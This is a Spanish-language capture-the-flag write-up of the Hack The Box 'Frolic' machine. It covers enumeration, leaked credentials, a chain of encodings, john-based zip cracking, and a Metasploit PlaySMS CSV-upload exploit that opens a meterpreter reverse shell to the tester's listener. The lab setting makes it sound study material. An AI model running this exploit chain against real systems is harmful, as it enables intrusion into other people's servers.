---
title: "Hack The Box - Frolic"
excerpt: "<img src='/images/portfolio/frolic/cover.webp' width='500' height=auto><br/><br/>Frolic is not overly challenging, however a great deal of enumeration is required due to the amount of services and content running on the machine. The privilege escalation features an easy difficulty return-oriented programming (ROP) exploitation challenge, and is a great learning experience for beginners."
collection: portfolio
---

NMAP
------

Utilizo la herramienta nmap para escaneo de puertos y servicios.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# nmap -A 10.10.10.111
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 12:41 CET
    Nmap scan report for 10.10.10.111
    Host is up (0.040s latency).
    Not shown: 996 closed tcp ports (reset)
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
    |   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
    |_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    9999/tcp open  http        nginx 1.10.3 (Ubuntu)
    |_http-title: Welcome to nginx!
    |_http-server-header: nginx/1.10.3 (Ubuntu)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=1/22%OT=22%CT=1%CU=42257%PV=Y%DS=2%DC=T%G=Y%TM=65AE
    OS:5482%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)
    OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
    OS:ST11NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
    OS:ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
    OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
    OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
    OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
    OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
    OS:%CD=S)

    Network Distance: 2 hops
    Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2024-01-22T11:41:52
    |_  start_date: N/A
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    |_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: 0s
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: frolic
    |   NetBIOS computer name: FROLIC\x00
    |   Domain name: \x00
    |   FQDN: frolic
    |_  System time: 2024-01-22T17:11:52+05:30

    TRACEROUTE (using port 199/tcp)
    HOP RTT      ADDRESS
    1   39.63 ms 10.10.14.1
    2   39.84 ms 10.10.10.111

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 25.96 seconds

SAMBA
------

En cuanto a samba, no parece que haya nada interesante, solo alberga dos directorios privados.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# smbclient -L 10.10.10.111

            Sharename       Type      Comment
            ---------       ----      -------
            print$          Disk      Printer Drivers
            IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
    Reconnecting with SMB1 for workgroup listing.

            Server               Comment
            ---------            -------

            Workgroup            Master
            ---------            -------
            WORKGROUP            FROLIC

HTTP
------

En el escaneo de nmap, se obtuvo ver que el servicio http se encontraba en el puerto 9999. Voy a hacer un escaneo de directorios con gobuster a ver si consigo algo.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# gobuster dir --url http://10.10.10.111:9999/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -t 15
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.111:9999/
    [+] Method:                  GET
    [+] Threads:                 15
    [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]
    /test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/]
    /dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]
    /backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]
    /loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/]
    Progress: 81643 / 81644 (100.00%)
    ===============================================================
    Finished
    ===============================================================

Si accedo a la dirección /admin, obtengo una interfaz de login.<br/>

<img src='/images/portfolio/frolic/admin.png' width='900' height=auto><br/><br/>

Trato de acceder con posibles credenciales pero no consigo acceso. La dirección /test no parece que contenga nada interesante. Procederé a enumerar directorios en la dirección /dev a ver si encuentro algo con lo que seguir.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# gobuster dir --url http://10.10.10.111:9999/dev --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -t 15
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.111:9999/dev
    [+] Method:                  GET
    [+] Threads:                 15
    [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /test                 (Status: 200) [Size: 5]
    /backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/backup/]
    Progress: 81643 / 81644 (100.00%)
    ===============================================================
    Finished
    ===============================================================

Si intento acceder a la dirección /dev/backup obtengo lo siguiente.<br/>

<img src='/images/portfolio/frolic/backup.png' width='900' height=auto><br/><br/>

Me aparece un directorio llamado playsms, esto me da una pista de que el servidor hace uso del portal playSMS. Probando a entrar a la ruta /playsms consigo el siguiente login.<br/>

<img src='/images/portfolio/frolic/playsms.png' width='900' height=auto><br/><br/>

Investigando la dirección /backup que conseguí en el análisis inicial con gobuster me aparece lo siguiente.<br/>

<img src='/images/portfolio/frolic/backupCredentials.png' width='900' height=auto><br/><br/>

Accediendo a los ficheros 'password.txt' y 'user.txt' obtengo como salida 'password - imnothuman' y 'user - admin'. Si trato de acceder con estas credenciales a las direcciones /admin y /playsms no consigo acceso.<br/><br/>

Analizando la ruta /admin con Burpsuite, observo que dentro hay un fichero de login en formato .js en la ruta /admin/js/login. Si accedo a esa dirección obtengo el siguiente código.<br/>

    var attempt = 3; // Variable to count number of attempts.
    // Below function Executes on click of login button.
    function validate() {
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        if (username == "admin" && password == "superduperlooperpassword_lol") {
            alert("Login successfully");
            window.location = "success.html"; // Redirecting to other page.
            return false;
        } else {
            attempt--; // Decrementing by one.
            alert("You have left " + attempt + " attempt;");
            // Disabling fields after 3 attempts.
            if (attempt == 0) {
                document.getElementById("username").disabled = true;
                document.getElementById("password").disabled = true;
                document.getElementById("submit").disabled = true;
                return false;
            }
        }
    }

Como puede verse, hay una comprobación de credenciales en texto plano 'admin:superduperlooperpassword_lol'. Si trato de acceder a la ruta /admin ahora si consigo acceso. La dirección me devuelve lo siguiente.<br/>

<img src='/images/portfolio/frolic/encr_1.png' width='900' height=auto><br/><br/>

Parece un mensaje que ha sido encriptado, voy a utilizar ook-language (https://www.dcode.fr/ook-language) para tratar de desencriptarlo.<br/>

<img src='/images/portfolio/frolic/inp_ecnr_1.png' width='900' height=auto><br/>

<img src='/images/portfolio/frolic/result_ecnr_1.png' width='900' height=auto><br/><br/>

Obtengo como pista que acceda a la ruta '/asdiSIAJJ0QWE9JAS'. Accedo y me encuentro lo que parece ser otro mensaje encriptado.<br/>

<img src='/images/portfolio/frolic/encr_2.png' width='900' height=auto><br/><br/>

Me doy cuenta de que se trata de un archivo codificado en base64. Voy a generar un fichero a partir de este mensaje a ver que consigo.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA" | base64 -d > file.txt                                                
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# file file.txt
    file.txt: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# mv file.txt file.zip

Resulta que se trata de un fichero .zip protegido con contraseña. Voy a tratar de romper la contraseña con 'zip2john' que ya utilicé en otro proyecto. La contraseña que obtengo con 'john' es 'password'.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# zip2john file.zip > hash.txt
    ver 2.0 efh 5455 efh 7875 file.zip/index.php PKZIP Encr: TS_chk, cmplen=176, decmplen=617, crc=145BFE23 ts=89C3 cs=89c3 type=8
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (PKZIP [32/64])
    No password hashes left to crack (see FAQ)

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# john hash.txt --show                                                    
    file.zip/index.php:password:index.php:file.zip::file.zip

Al descomprimir el fichero, obtengo un fichero llamado 'index.php'.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# 7z x file.zip

    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
    p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,12 CPUs Intel(R) Core(TM) i7-10710U CPU @ 1.10GHz (A0660),ASM,AES-NI)

    Scanning the drive for archives:
    1 file, 360 bytes (1 KiB)

    Extracting archive: file.zip
    --
    Path = file.zip
    Type = zip
    Physical Size = 360

        
    Enter password (will not be echoed):
    Everything is Ok

    Size:       617
    Compressed: 360
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# ll
    total 12
    -rw-r--r-- 1 root root  360 ene 22 16:05 file.zip
    -rw-r--r-- 1 root root  617 sep 23  2018 index.php
    drwxr-xr-x 2 nico nico 4096 ene 20 11:55 vpn

Si imprimo el contenido del fichero .php obtengo lo que parece ser otro mensaje codificado, esta vez en hexadecimal.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# cat index.php 
    4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a

Al convertirlo a texto plano, consigo otro mensaje en base64.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# echo "4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a" | xxd -r -p
    KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
    KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
    K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
    LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==

Una vez que decodifico el mensaje en base64, obtengo un mensaje encriptado que pasaré por la página web anterior, esta vez en un lenguaje llamado 'brainf*ck'.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# echo "KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==" | base64 -d
    +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
    ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
    <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
    ++..<

<img src='/images/portfolio/frolic/inp_ecnr_3.png' width='900' height=auto><br/>

<img src='/images/portfolio/frolic/result_ecnr_3.png' width='900' height=auto><br/><br/>

Metasploit
------

Buscando en Metasploit, encuentro un exploit con playSMS como víctima.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# msfconsole -q       
    msf6 > search playsms

    Matching Modules
    ================

    #  Name                                           Disclosure Date  Rank       Check  Description
    -  ----                                           ---------------  ----       -----  -----------
    0  exploit/multi/http/playsms_uploadcsv_exec      2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution
    1  exploit/multi/http/playsms_template_injection  2020-02-05       excellent  Yes    PlaySMS index.php Unauthenticated Template Injection Code Execution
    2  exploit/multi/http/playsms_filename_exec       2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution


    Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/playsms_filename_exec

Utilizaré el exploit 0 ya que parece que puedo conseguir un reverse shell. Relleno los campos necesarios y arranco el exploit obteniendo un reverse shell de manera satisfactoria.<br/>

    msf6 exploit(multi/http/playsms_uploadcsv_exec) > show options

    Module options (exploit/multi/http/playsms_uploadcsv_exec):

    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    PASSWORD   idkwhatispass    yes       Password to authenticate with
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS     10.10.10.111     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT      9999             yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /playsms         yes       Base playsms directory path
    USERNAME   admin            yes       Username to authenticate with
    VHOST                       no        HTTP server virtual host


    Payload options (php/meterpreter/reverse_tcp):

    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST  10.10.14.31      yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   PlaySMS 1.4



    View the full module info with the info, or info -d command.

    msf6 exploit(multi/http/playsms_uploadcsv_exec) > exploit

    [*] Started reverse TCP handler on 10.10.14.31:4444 
    [+] Authentication successful: admin:idkwhatispass
    [*] Sending stage (39927 bytes) to 10.10.10.111
    [*] Meterpreter session 1 opened (10.10.14.31:4444 -> 10.10.10.111:46690) at 2024-01-22 15:30:54 +0100

    meterpreter > shell
    Process 2102 created.
    Channel 0 created.
    whoami
    www-data

